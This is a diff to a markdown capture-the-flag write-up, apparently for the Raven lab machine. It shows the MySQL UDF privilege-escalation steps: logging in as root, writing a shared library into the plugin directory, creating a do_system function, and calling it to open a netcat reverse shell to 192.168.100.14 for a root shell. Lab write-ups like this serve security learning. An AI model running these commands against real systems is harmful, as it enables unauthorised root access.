@@ -59,11 +59,12 @@ we send this raven.so to attack machine
 ```bash
 mysql -u root -p R@v3nSecurity```
 
-```use mysql;```
-```>>>create table raven(line blob);```
-```>>>insert into raven values(load_file('/var/tmp/raven.so'));```
-```>>>select *from raven into dumpfile "/usr/lib/mysql/plugin/raven.so";```
-```>>>create function do_system returns integer soname 'raven.so';```
-```>>>select do_system("nc -nv 192.168.100.14 4444 -e /bin/bash"); ---> in another terminal we run ---> nc -nvlp 4444```
+```bash
+use mysql;```
+```create table raven(line blob);```
+```insert into raven values(load_file('/var/tmp/raven.so'));```
+```select *from raven into dumpfile "/usr/lib/mysql/plugin/raven.so";```
+```create function do_system returns integer soname 'raven.so';```
+```select do_system("nc -nv 192.168.100.14 4444 -e /bin/bash"); ---> in another terminal we run ---> nc -nvlp 4444```
 
 we obtain root shell and flag4 found...!
